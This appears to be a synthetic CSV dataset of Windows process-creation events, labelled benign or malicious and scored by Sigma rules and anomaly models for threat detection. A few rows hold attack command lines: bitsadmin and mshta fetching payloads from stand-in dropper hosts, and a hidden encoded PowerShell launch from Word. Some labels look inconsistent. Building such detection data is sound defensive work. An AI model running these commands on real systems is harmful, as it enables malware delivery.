UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-02T23:04:35.964Z,{20AF5327-F017-4FC6-878C-F501F42ADC19},59859,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,65096,NT AUTHORITY\SYSTEM,System,0,,,benign,2,9,0,0,34,3.8895,0,0,0,0,2,0.0,0,0,1,0,0,0,392754572,23,0,0,4,1.7891,-0.1082540379510085,0.08484302811483231,1,2,3,False,None,none,,22.77460736749457,0,svchost.exe → usoclient.exe: No known suspicious pattern,False,CLEAR,NONE,7.6,
2024-07-04T22:30:40.186Z,{8009FEF8-DF2E-4F85-A61C-CDEA2CA18031},54182,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,9837,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign,3,33,0,0,49,4.5173,0,0,0,0,3,0.0,0,0,1,0,0,0,2168783887,22,0,0,30,1.3349,0.49315728399903813,1.0248896744353848,1,15,3,False,None,none,,32.08963531283854,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,10.7,
2024-07-04T16:58:30.775Z,{6AFD99DB-24B5-4331-B30A-CC6D2EEAC47E},36226,C:\Windows\System32\cmd.exe,cmd.exe /c robocopy C:\Data D:\Backup /mir,C:\Windows\explorer.exe,C:\Windows\explorer.exe,53559,CORP\analyst01,Medium,0,,,benign,0,4,1,1,42,4.318,0,0,0,0,6,0.0,0,0,1,0,0,0,2764436884,16,0,0,58,0.9208,0.21249866708901635,0.7264645444390703,0,13,1,False,None,none,,39.402197903885934,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,13.1,
2024-07-03T12:04:34.481Z,{26D9A30C-1907-4DE0-8AEA-E10FAB92C0E1},12901,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,13595,NT AUTHORITY\SYSTEM,System,0,,,benign,2,15,0,0,77,4.5118,0,0,0,0,6,0.0,0,0,1,0,0,0,1801100127,12,0,0,4,1.8239,1.6157917516391251,1.0166541590566611,1,2,3,False,None,none,,33.928954188978764,0,svchost.exe → schtasks.exe: No known suspicious pattern,False,CLEAR,NONE,11.3,
2024-07-03T12:17:11.026Z,{7A52A569-1145-44B6-8819-AE84B23C7E42},21897,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,40132,NT AUTHORITY\SYSTEM,System,0,,,benign,2,36,0,0,28,3.7499,0,0,0,0,3,0.0,0,0,1,0,0,0,2407871594,12,0,0,17,1.8239,-0.3488185667310272,-0.12418932586151261,1,2,3,False,None,none,,8.763599542785718,0,svchost.exe → update.exe: No known suspicious pattern,False,CLEAR,NONE,2.9,
2024-07-01T13:13:47.550Z,{D8B5BD32-C277-4B56-9CD4-7F31360E3506},14885,C:\Python311\python.exe,python.exe script.py,C:\Windows\System32\cmd.exe,cmd.exe,14356,CORP\klee,Medium,0,,,benign,1,60,0,0,20,3.6842,0,0,0,0,2,0.0,0,0,2,0,0,1,2869459594,13,0,0,13,2.9031,-0.669571271771052,-0.22256630047645368,0,6,1,False,None,none,,57.686851254917684,0,cmd.exe → python.exe: No known suspicious pattern,False,CLEAR,NONE,19.2,
2024-07-07T04:37:01.324Z,{29ECF114-F9B9-457D-A029-ED503031E35A},25755,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\svc346.csproj,C:\Windows\System32\cmd.exe,powershell.exe,38378,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,81,4.9481,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,4,1,1,37,3.9031,1.7761681041591375,1.6699551335543632,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,81.68057179052457,75,cmd.exe → msbuild.exe: Command shell spawning MSBuild [Modifiers: +10 off-hours],True,ALERT,CRITICAL,98.2,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 82 | Chain Risk: 75
2024-07-03T14:22:33.548Z,{4622A677-CAFA-4556-841C-D4F8E9C46B41},1637,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",46928,CORP\klee,Medium,0,,,benign,12,39,0,0,12,3.2516,0,0,0,0,1,0.0,0,0,2,1,0,0,2621902487,14,0,0,22,1.9031,-0.9903239768110769,-0.8703270191739234,0,6,1,False,None,none,,40.07223434948105,0,excel.exe → odbcad32.exe: No known suspicious pattern,False,CLEAR,NONE,13.4,
2024-07-04T17:36:42.027Z,{7B715970-546F-4510-B02C-2EF396CBD81B},6501,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",43123,CORP\netadmin,Medium,0,,,benign,0,52,0,0,61,4.5873,0,0,0,0,3,0.0,0,0,1,0,0,0,2156223548,17,0,0,36,1.7891,0.9742863415590755,1.1297053247100566,0,8,1,False,None,none,,16.747150936227335,0,explorer.exe → outlook.exe: No known suspicious pattern,False,CLEAR,NONE,5.6,
2024-07-04T13:15:21.993Z,{6721AE98-CEBF-420E-8BC6-4EEF3ACA6CA0},19229,C:\Users\sysadmin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,4299,CORP\sysadmin,High,0,,,benign,0,51,0,0,39,3.5665,0,0,0,0,3,0.0,0,0,1,0,0,0,1222512313,13,0,0,15,1.5809,0.09221640269900704,-0.39880632958115136,0,10,2,False,None,none,,2.2059827882462026,0,explorer.exe → installer.exe: No known suspicious pattern,False,CLEAR,NONE,0.7,
2024-07-02T19:16:42.083Z,{A8641EFD-01F0-4439-85E9-E4A5186F2CAE},11292,C:\Windows\explorer.exe,explorer.exe C:\Users\agarwal\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16719,CORP\agarwal,Medium,0,,,benign,0,0,0,0,39,4.163,0,0,0,0,2,0.0,0,0,1,0,0,0,1994286725,19,0,0,16,1.7891,0.09221640269900704,0.49437274740229886,0,12,1,False,None,none,,12.249343575032874,0,explorer.exe → explorer.exe: No known suspicious pattern,False,CLEAR,NONE,4.1,
2024-07-01T00:04:12.924Z,{3E720216-FDB4-4488-9041-D9AE78E4AE5A},43335,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,30060,NT AUTHORITY\SYSTEM,System,0,,,benign,2,33,0,0,57,4.4954,0,0,0,0,6,0.0,0,0,1,0,0,0,65539420,0,1,0,4,1.6726,0.813909989039063,0.9920973495637382,1,2,3,False,None,none,,41.83479496656715,10,svchost.exe → svchost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,13.9,
2024-07-03T11:41:32.409Z,{69D764DB-C4E9-4F92-9747-FDBB16DAB145},45532,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",65300,CORP\agarwal,Medium,0,,,benign,0,42,0,0,59,4.4871,0,0,0,0,3,0.0,0,0,1,0,0,0,3033179346,11,0,0,41,1.699,0.8940981652990692,0.9796692081740269,0,12,1,False,None,none,,10.852529494293222,0,explorer.exe → excel.exe: No known suspicious pattern,False,CLEAR,NONE,3.6,
2024-07-05T03:32:08.652Z,{B5053151-D1C6-4F60-94C8-D9D9E2B7E9A0},54737,C:\Windows\System32\wuauclt.exe,wuauclt.exe /detectnow /updatenow,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,26844,NT AUTHORITY\SYSTEM,System,0,,,benign,2,2,0,0,33,3.7377,0,0,0,0,3,0.0,0,0,1,0,0,0,2547975307,3,1,0,32,1.8617,-0.1483481260810116,-0.14245719633795534,1,2,3,False,None,none,,26.93989657101916,10,svchost.exe → wuauclt.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,9.0,
2024-07-01T19:38:32.393Z,{78A20565-ABB8-4BF8-ABE5-53CCBD6EB2D0},31324,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,39032,NT AUTHORITY\SYSTEM,System,0,,,benign,3,25,0,0,31,4.236,0,0,0,0,1,0.0,0,0,1,0,0,0,1224424709,19,0,0,38,1.6726,-0.22853630234101782,0.6036804969744555,1,2,3,False,None,none,,17.696036748180862,0,services.exe → spoolsv.exe: No known suspicious pattern,False,CLEAR,NONE,5.9,
2024-07-03T10:37:27.650Z,{FC7F9D98-7642-414D-835D-980907793C6A},54362,C:\Program Files\Microsoft VS Code\Code.exe,Code.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",33225,CORP\dbadmin,Medium,0,,,benign,0,53,0,0,8,2.4056,0,0,0,0,1,0.0,0,0,1,0,0,0,1855645844,10,0,0,37,1.9488,-1.1507003293310893,-2.1370990210649516,0,4,1,False,None,none,,21.33396872511004,0,explorer.exe → code.exe: No known suspicious pattern,False,CLEAR,NONE,7.1,
2024-07-04T16:53:00.311Z,{FFF55108-8956-4B4F-A2EF-1A21DBD9AFD1},19803,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",14774,CORP\netadmin,Medium,0,,,benign,0,52,0,0,61,4.5873,0,0,0,0,3,0.0,0,0,1,0,0,0,2156223548,16,0,0,53,1.7891,0.9742863415590755,1.1297053247100566,0,8,1,False,None,none,,15.16399662814805,0,explorer.exe → outlook.exe: No known suspicious pattern,False,CLEAR,NONE,5.1,
2024-07-02T17:36:41.664Z,{BCDEC698-6F20-4320-91E9-C37891C5C5EB},36287,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",12438,CORP\netadmin,Low,0,,,benign,9,18,0,0,29,3.7623,0,0,0,0,2,0.0,0,0,2,0,1,0,2603814309,17,0,0,36,1.9031,-0.30872447860102403,-0.10562198209857021,0,8,0,False,None,none,,44.53358290325656,0,msedge.exe → msedge.exe: No known suspicious pattern,False,CLEAR,NONE,14.8,
2024-07-03T08:58:49.091Z,{63256A7B-FF1A-439D-8C36-0341AEC38676},43749,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,38626,CORP\analyst01,Medium,0,,,benign,0,4,1,1,19,3.7216,0,0,0,0,3,0.0,0,0,1,0,0,0,2764436884,8,0,0,58,0.9208,-0.7096653599010552,-0.16656479590112944,0,13,1,False,None,none,,32.932546400119065,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,11.0,
2024-07-03T08:08:47.431Z,{D4D5CD68-AD3A-4269-A226-FFBD2130625A},35477,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",8448,CORP\analyst01,Medium,0,,,benign,0,41,0,0,9,2.6416,0,0,0,0,1,0.0,0,0,1,0,0,0,2183728879,8,0,0,8,2.058,-1.1106062412010862,-1.7837205429960596,0,13,1,False,None,none,,18.9183037171427,0,explorer.exe → teams.exe: No known suspicious pattern,False,CLEAR,NONE,6.3,
2024-07-01T14:48:02.676Z,{2E87BCD8-F52A-4A14-9A25-09CFC676BFFE},61458,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,43039,CORP\sysadmin,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,14,0,0,48,3.9031,1.575697663509122,1.3977339161267168,0,10,2,False,None,none,,72.51058698492865,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.7,"ANOMALY SCORE: 73/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T08:10:47.546Z,{731248A6-495F-43F7-9E3F-E4D1161374C0},37902,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi MD5,C:\Windows\System32\cmd.exe,cmd.exe,5583,CORP\itops,High,0,,,gray_area,1,8,1,0,49,4.5681,0,0,0,0,4,0.0,0,1,2,0,0,1,1473216238,8,0,0,10,3.9031,0.49315728399903813,1.1009558892061473,0,5,2,False,None,none,,67.22643240238102,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,22.4,
2024-07-02T03:01:13.174Z,{80DB19E8-86B4-436B-86AD-AA7FDE4853BB},42824,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,20124,NT AUTHORITY\SYSTEM,System,0,,,benign,2,9,0,0,34,3.8895,0,0,0,0,2,0.0,0,0,1,0,0,0,392754572,3,1,0,1,1.7891,-0.1082540379510085,0.08484302811483231,1,2,3,False,None,none,,27.221092274357176,10,svchost.exe → usoclient.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,9.1,
2024-07-02T11:34:27.984Z,{3543E21B-3A1B-4442-B234-ABB8AB4C12DE},60735,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi SHA1,C:\Windows\System32\cmd.exe,cmd.exe,37382,CORP\itops,High,0,,,gray_area,1,8,1,0,50,4.6582,0,0,0,0,4,0.0,0,1,2,0,0,1,1473216238,11,0,0,34,3.9031,0.5332513721290413,1.2358686047739738,0,5,2,False,None,none,,67.14032258065704,50,cmd.exe → certutil.exe: Command shell invoking certutil,True,CLEAR,NONE,22.4,
2024-07-03T03:47:29.229Z,{E662B569-946C-43D1-8568-3676350E5BE1},2758,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,52853,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious,10,3,1,1,250,4.8986,1,0,0,1,6,0.5,1,0,2,1,0,0,3072976960,3,1,0,47,3.9031,8.552068998129663,1.5958354951458456,0,6,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"winword.exe → powershell.exe: Office Word directly spawning PowerShell [Modifiers: +20 Office→Script chain, +10 off-hours, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-04T00:16:13.255Z,{60A81D32-0565-4FAD-9E2D-59E0EC8640DB},46427,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,5442,NT AUTHORITY\SYSTEM,System,0,,,benign,2,33,0,0,57,4.4954,0,0,0,0,6,0.0,0,0,1,0,0,0,65539420,0,1,0,16,1.6726,0.813909989039063,0.9920973495637382,1,2,3,False,None,none,,41.83479496656715,10,svchost.exe → svchost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,13.9,
2024-07-02T08:42:07.476Z,{2D3EAE9E-5F75-406D-970E-F70EF15D6AD7},21106,C:\Windows\System32\cmd.exe,cmd.exe /c net localgroup administrators,C:\Windows\explorer.exe,C:\Windows\explorer.exe,11467,CORP\sysadmin,High,0,,,benign,0,4,1,1,40,4.1087,0,0,0,0,5,0.0,0,0,1,0,0,0,2764436884,8,0,0,42,0.9208,0.13231049082901014,0.4130657501178031,0,10,2,False,None,none,,38.27164401027528,0,explorer.exe → cmd.exe: No known suspicious pattern,False,CLEAR,NONE,12.8,
2024-07-04T01:33:42.692Z,{C93E2348-3FB8-4EFC-A13B-432A500E167B},6570,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job4861 /download /priority high http://dropper-srv7283.xyz/module418.exe C:\Users\Public\installer194.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,8813,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,130,4.9633,1,1,0,0,8,0.125,0,1,2,0,0,1,1514001697,1,1,0,33,3.9031,3.74077842252929,1.6927151033282921,0,0,1,True,BITSAdmin File Download,high,attack.t1197,90.63066663376722,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.1,Sigma rule matched: BITSAdmin File Download | ML Score: 91 | Chain Risk: 90
2024-07-05T08:50:23.718Z,{433B9D76-7C0D-476A-9EC0-1074D8682A9B},59687,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Disk | Get-Partition | Get-Volume""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,54234,CORP\mjones,Medium,0,,,benign,1,3,1,1,74,4.4639,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,8,0,0,50,1.3846,1.495509487249116,0.9449303069401356,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,53.49314508033542,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,95.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 53 | Chain Risk: 5
2024-07-05T12:46:53.572Z,{E2F19849-B6BD-4879-9003-BAEC90D16C1B},60966,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\agarwal\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",39203,CORP\agarwal,Medium,0,,,benign,10,27,0,0,49,4.4008,0,0,0,0,2,0.0,0,0,2,1,0,0,2627095310,12,0,0,46,1.757,0.49315728399903813,0.8504464850496826,0,12,1,False,None,none,,39.37514659539996,0,winword.exe → acrobat.exe: No known suspicious pattern,False,CLEAR,NONE,13.1,
2024-07-03T09:20:07.007Z,{E5448FB0-3624-4C1C-A121-05B85AA6850D},33596,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,49956,NT AUTHORITY\SYSTEM,System,0,,,benign,3,33,0,0,48,4.7147,0,0,0,0,4,0.0,0,0,1,0,0,0,2168783887,9,0,0,20,1.3349,0.453063195869035,1.3204698082099582,1,2,3,False,None,none,,25.132288522180964,0,services.exe → svchost.exe: No known suspicious pattern,False,CLEAR,NONE,8.4,
2024-07-05T17:23:44.689Z,{10A7BCE9-C15D-46E2-9FB2-528925C10230},64120,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,46239,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,239,4.8519,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,17,0,0,23,1.3846,8.11103402869963,1.525908482748314,0,10,2,False,None,none,,94.8387897821431,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.6,"ANOMALY SCORE: 95/100 | Unusual factors: unusually long command line: 239.00 (baseline: 36.70±24.93, z=8.1); command length significantly above baseline: 8.11 (baseline: -0.00±1.00, z=8.1); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-01T18:21:03.345Z,{A79F8EA2-5616-4B72-B364-DCB6F7FC57AA},52627,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager6379.net/script812.hta"""""")",C:\Windows\System32\cmd.exe,cmd.exe,48252,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious,1,5,1,1,101,4.7515,0,1,0,0,3,0.0,0,0,2,0,0,1,345041238,18,0,0,21,3.9031,2.5780498667591996,1.375572892925786,0,6,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,73.82984045861174,75,cmd.exe → mshta.exe: Command shell invoking mshta [Modifiers: +15 URL in command],True,ALERT,CRITICAL,97.4,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 74 | Chain Risk: 75
2024-07-01T01:53:08.182Z,{B671BE8B-4617-4493-8B78-F93625F8677A},58245,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,3049,NT AUTHORITY\SYSTEM,System,0,,,benign,2,22,0,0,31,3.6797,0,0,0,0,3,0.0,0,0,1,0,0,0,26065344,1,1,0,53,1.8617,-0.22853630234101782,-0.2293044494226828,1,2,3,False,None,none,,30.668001081221703,10,svchost.exe → conhost.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,10.2,
2024-07-04T16:55:23.840Z,{BF85C016-B843-4C02-9982-76A43AA799B3},4683,C:\Users\sysadmin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,34768,CORP\sysadmin,High,0,,,benign,0,23,0,0,18,3.5305,0,0,0,0,3,0.0,0,0,1,0,0,0,2635501913,16,0,0,55,1.6726,-0.7497594480310582,-0.4527115211509824,0,10,2,False,None,none,,4.946264153680943,0,explorer.exe → setup.exe: No known suspicious pattern,False,CLEAR,NONE,1.6,
2024-07-02T01:27:38.266Z,{63E8066A-1F8A-435A-A74C-B149C6CD84AD},10781,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded476.exe C:\Users\Public\encoded439.txt,C:\Windows\System32\cmd.exe,cmd.exe,6836,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious,1,8,1,0,82,4.3737,1,0,0,0,4,0.25,0,0,2,0,0,1,1473216238,1,1,0,27,3.9031,1.8162621922891407,0.80986785472906,0,6,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,94.9838507628084,60,cmd.exe → certutil.exe: Command shell invoking certutil [Modifiers: +10 off-hours],True,ALERT,CRITICAL,99.5,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 95 | Chain Risk: 60
2024-07-01T11:14:44.898Z,{B179B3DC-90DD-47C8-8C07-9EF4C08EBF8F},23567,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_4.0.86.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,21453,CORP\itops,High,0,,,benign,0,12,0,0,60,4.4172,0,0,0,0,5,0.0,0,0,1,0,0,0,2082361945,11,0,0,14,1.4881,0.9341922534290723,0.8750032945426055,0,5,2,False,None,none,,13.4041603165062,0,explorer.exe → msiexec.exe: No known suspicious pattern,False,CLEAR,NONE,4.5,
2024-07-01T17:53:42.308Z,{12681665-B66A-4D51-991D-4C75CC3B5AF3},33148,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,52767,CORP\itops,High,0,,,benign,0,11,0,0,11,3.0272,0,0,0,0,1,0.0,0,0,1,0,0,0,1935590950,17,0,0,53,2.0,-1.03041806494108,-1.2063360466258695,0,5,2,False,None,none,,12.426467455257903,0,explorer.exe → perfmon.exe: No known suspicious pattern,False,CLEAR,NONE,4.1,
2024-07-01T01:37:50.707Z,{517B5CA0-CC96-415A-9946-5E8F10CD5345},32147,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,46115,NT AUTHORITY\SYSTEM,System,0,,,benign,2,15,0,0,77,4.5118,0,0,0,0,6,0.0,0,0,1,0,0,0,1801100127,1,1,0,37,1.8239,1.6157917516391251,1.0166541590566611,1,2,3,False,None,none,,52.24646854929699,10,svchost.exe → schtasks.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,CLEAR,NONE,17.4,
2024-07-01T11:33:58.810Z,{64F90951-C10B-479E-8675-723C3877D906},24674,C:\Windows\System32\perfmon.exe,perfmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,26434,CORP\admin,High,0,,,benign,0,11,0,0,11,3.0272,0,0,0,0,1,0.0,0,0,1,0,0,0,1935590950,11,0,0,33,2.0,-1.03041806494108,-1.2063360466258695,0,3,2,False,None,none,,8.682642484044845,0,explorer.exe → perfmon.exe: No known suspicious pattern,False,CLEAR,NONE,2.9,
